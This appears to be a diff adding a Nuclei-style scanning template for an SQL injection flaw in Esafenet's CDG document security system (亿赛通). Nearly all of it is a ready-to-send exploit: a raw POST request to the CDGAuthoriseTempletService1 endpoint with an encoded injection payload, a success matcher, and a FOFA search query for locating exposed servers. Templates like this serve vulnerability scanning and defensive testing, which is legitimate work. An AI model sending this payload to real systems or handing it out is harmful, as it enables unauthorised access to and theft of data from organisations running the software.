@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - status_code_1 == 200
+            - len(body_1) > 1024
+          type: dsl
+      matchers-condition: and
+      max-redirects: 3
+      raw:
+        - |-
+          @timeout: 30s
+          POST /CDGServer3/CDGAuthoriseTempletService1 HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/xml
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+          CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBCKFEIPGINHHBEGDOMEOPDKJGPNIJEDNOMEKLJHCGOJCEIPFPEDGBEHJLMNEEFIKFPGCCKCFCCOMONKACOEENLFIBAGNJBLHDEJCIPHOPDOAMGLINIEJDIFOLLGEDIDMDAKIPEINHHOFBOHLPEJBPJBKJLDDEIFOGLGHKANECEEGNDCNMJNLNJBFKNGKKJFODMFEKBOGFNDNJMCMHOFJBLGHEBALFGNNGLPBMKHHHGNKNHJGLFLODDIKAAOOOAJAEMBLBNMGOFJELPABKOEGMFLIBGPMHJPEJCKFBGHHNGMDAJBKBNNMIMFELPGEHDFGNHMBLEIKMINOAOAINBLEOIGHAMOPDNOIFFEFLGBFOFAGACH
+id: yisaitong-CDG-CDGAuthoriseTempletService1-sqli
+info:
+    author: xx
+    description: 亿赛通电子文档安全管理系统 CDGAuthoriseTempletService1 存在SQL 注入漏洞
+    metadata:
+        fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+    name: 亿赛通电子文档安全管理系统 CDGAuthoriseTempletService1 存在SQL 注入漏洞
+    severity: high
+    tags:
+        - yisaitong
